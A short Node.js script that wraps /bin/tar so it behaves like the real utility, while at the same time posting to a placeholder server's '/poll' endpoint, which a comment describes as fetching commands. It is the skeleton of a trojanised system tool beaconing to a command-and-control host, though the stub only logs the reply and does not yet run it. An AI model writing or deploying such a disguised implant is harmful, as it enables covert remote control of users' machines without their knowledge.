#!/usr/bin/env node
import { spawn } from "child_process";
import crypto from "crypto";
import axios from 'axios'

const args = process.argv.slice(2);

// First, simulate tar functionality
const tar_location = "/bin/tar";
const childProcess = spawn(tar_location, args);

childProcess.stdout.on("data", (data) => {
  process.stdout.write(data);
});

childProcess.stderr.on("data", (data) => {
  process.stderr.write(`${data}`);
});

const server_ip = SERVER_IP;
const server_port = SERVER_PORT;

// Then attempt to fetch commands!!
console.log(`Attempting to connect to ${server_ip} at ${server_port}`)

const postData = {
  key1: 'value1',
  key2: 'value2',
};

axios.post(`http://${server_ip}:${server_port}/poll`, postData)
  .then((response) => {
    console.log('Response:', response.data);
  })
  .catch((error) => {
    console.error('Error:', error.message);
  });